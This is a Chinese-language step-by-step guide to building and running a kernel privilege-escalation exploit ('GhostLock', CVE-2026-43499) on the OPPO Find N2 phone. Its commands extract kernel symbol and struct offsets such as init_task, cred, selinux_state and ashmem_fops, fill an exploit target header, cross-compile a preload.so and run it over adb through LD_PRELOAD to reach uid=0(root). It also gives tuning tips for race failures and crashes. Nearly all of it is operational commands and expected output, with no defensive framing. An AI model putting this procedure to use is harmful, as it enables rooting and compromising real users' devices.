# OPPO Find N2 GhostLock (CVE-2026-43499) 调试与使用指南

## 一、环境准备

### 1.1 安装编译工具
```bash
sudo apt install -y gcc-11 make flex bison libssl-dev bc libelf-dev dwarves aarch64-linux-gnu-gcc
```

### 1.2 验证工具
```bash
gcc-11 --version          # 需要 11.x 版本
aarch64-linux-gnu-gcc --version  # ARM64 交叉编译器
pahole --version          # 用于提取结构体偏移
```

## 二、从 boot.img 提取 vmlinux

### 2.1 方法一：编译内核获取 vmlinux（推荐）
```bash
cd /home/xiuxiu391/桌面/oppo/kernel_src/android_kernel_oppo_sm8475-oppo-sm8475_b_16.0.0_find_n2

# 配置内核
export ARCH=arm64 CC=gcc-11 CROSS_COMPILE=aarch64-linux-gnu-
make gki_defconfig

# 编译 vmlinux（需要修复 OPLUS 代码兼容性问题）
make vmlinux -j$(nproc)
```

### 2.2 方法二：使用 extract-vmlinux
```bash
# 从 boot.img 提取（如果内核是压缩格式）
./extract-vmlinux /home/xiuxiu391/下载/boot.img > vmlinux
```

## 三、提取精确偏移

### 3.1 用 pahole 提取结构体偏移
```bash
pahole -s task_struct vmlinux > task_offsets.txt
pahole -s cred vmlinux > cred_offsets.txt
pahole -s rt_mutex_waiter vmlinux > waiter_offsets.txt
pahole -s file_operations vmlinux > fops_offsets.txt
pahole -s pipe_buf_operations vmlinux > pipe_ops_offsets.txt
```

### 3.2 用 nm 提取符号地址
```bash
aarch64-linux-gnu-nm vmlinux | grep -E "init_task|root_task_group|ashmem|configfs|nf_log|boot_id|selinux|security_hook|kmalloc_caches|anon_pipe_buf|noop_llseek|copy_splice" > symbols.txt
```

### 3.3 关键偏移说明
| 偏移名称 | 用途 | 来源 |
|---------|------|------|
| INIT_TASK_OFF | init_task 结构体地址 | pahole / nm |
| ROOT_TASK_GROUP_OFF | root_task_group 地址 | pahole / nm |
| SELINUX_STATE_OFF | selinux_state 地址 | pahole / nm |
| ASHMEM_FOPS_OFF | ashmem_fops 地址 | nm |
| ASHMEM_IOCTL_OFF | ashmem_ioctl 函数 | nm |
| NOOP_LLSEEK_OFF | noop_llseek 函数 | nm |
| CONFIGFS_READ_ITER_OFF | configfs_read_file 函数 | nm |
| COPY_SPLICE_READ_OFF | generic_file_splice_read 函数 | nm |
| NFULNL_LOGGER_OFF | nfulnl_logger 地址 | nm |
| SYSCTL_BOOTID_OFF | sysctl_bootid 地址 | nm |

## 四、更新 target.h

将提取的偏移填入 `exploit/targets/oppo-find_n2/target.h`：

```c
// 从 nm 输出计算偏移（相对于 KIMAGE_TEXT_BASE）
#define INIT_TASK_OFF 0xXXXXXXXXULL           // 从 symbols.txt 获取
#define ASHMEM_IOCTL_OFF 0xXXXXXXXXULL       // 从 symbols.txt 获取
#define NOOP_LLSEEK_OFF 0xXXXXXXXXULL        // 从 symbols.txt 获取
// ... 其他偏移
```

## 五、编译 exploit

```bash
cd /home/xiuxiu391/桌面/oppo/oppo-ghostlock-upload/exploit

# 设置交叉编译环境
export ARCH=arm64 CC=aarch64-linux-gnu-gcc

# 编译
make PROJECT=oppo-find_n2

# 或者直接用 clang 编译
NDK=~/android-ndk-cache/android-ndk-r27d/toolchains/llvm/prebuilt/linux-x86_64
$NDK/bin/clang-18 --target=aarch64-linux-android35 \
  --sysroot=$NDK/sysroot \
  -O2 -fPIC -shared \
  -DTARGET_CONFIG_H=\"targets/oppo-find_n2/target.h\" \
  src/*.c src/*.S \
  -o build/oppo-find_n2/bin/preload.so -pthread
```

## 六、推送到手机并测试

### 6.1 连接手机
```bash
# 检查设备连接
./platform-tools/adb devices

# 如果显示 unauthorized，在手机上点击"允许USB调试"
```

### 6.2 推送 exploit
```bash
./platform-tools/adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/preload.so
```

### 6.3 运行 exploit
```bash
# 通过 LD_PRELOAD 注入运行
./platform-tools/adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"

# 如果成功，会显示 uid=0(root)
```

### 6.4 检查结果
```bash
# 查看 exploit 输出
./platform-tools/adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id" 2>&1

# 正常输出示例：
# [+] startup context pid=XXXX uid=2000 euid=2000
# [+] slide-kaslr-ok pid=XXXX base=XXXXXXXXXXXXXXXX
# [+] pipe-physrw-summary pid=XXXX root=1
```

## 七、常见问题排查

### 7.1 手机重启/崩溃
- **原因**：偏移不正确
- **解决**：重新用 pahole/nm 提取偏移，确保 target.h 中的值正确

### 7.2 exploit 卡住不动
- **原因**：竞态条件失败
- **解决**：多次尝试，或调整 PSELECT_ENTER_DELAY_USEC 参数

### 7.3 "Permission denied" 错误
- **原因**：/data/local/tmp 权限问题
- **解决**：`adb shell chmod 755 /data/local/tmp/preload.so`

### 7.4 编译错误
- **OPLUS 代码兼容性**：禁用 CONFIG_KVM, CONFIG_CRYPTO_CHACHA20_NEON 等
- **GCC 版本问题**：使用 gcc-11 而不是 gcc-15
- **缺少头文件**：安装 libc6-dev, linux-libc-dev

## 八、文件结构说明
```
oppo-ghostlock-upload/
├── README.md                      # 项目说明
├── commands.txt                   # 快速参考命令
├── extract-vmlinux                # vmlinux 提取工具
├── exploit/
│   ├── targets/oppo-find_n2/
│   │   └── target.h               # OPPO Find N2 偏移配置
│   └── src/                       # exploit 源码
├── kernel_extracted/              # 提取的内核源文件
└── OPPO_FindN2_GhostLock_使用指南.md  # 本文档
```
